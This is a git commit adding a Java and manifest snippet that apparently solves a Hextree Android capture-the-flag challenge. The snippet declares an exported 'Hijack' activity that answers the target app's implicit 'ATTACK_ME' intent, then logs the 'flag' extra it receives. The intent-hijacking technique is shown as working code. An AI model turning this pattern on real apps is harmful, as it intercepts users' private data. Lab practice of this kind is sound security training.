af2af3f8501f21bc5c342cb1c679ce2a3221eb53
Clov3rx <clov3rx@localhost.localdomain>
2026-01-25 23:05:07 +0200

    Challenge10

---
+++ Challenge10/flag.java
@@ -0,0 +1,30 @@
+// in androidmanifest.xml
+        <activity
+            android:name=".Hijack"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="io.hextree.attacksurface.ATTACK_ME" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </activity>
+
+
+
+    // in Hijack class 
+    public class Hijack extends AppCompatActivity {
+
+        @Override
+        protected void onCreate(Bundle savedInstanceState) {
+            super.onCreate(savedInstanceState);
+            EdgeToEdge.enable(this);
+            setContentView(R.layout.activity_hijack);
+            ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
+                Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
+                v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
+                return insets;
+            });
+
+            Intent intent = getIntent();
+            Log.d("Flag10", intent.getStringExtra("flag"));
+        }
+    }
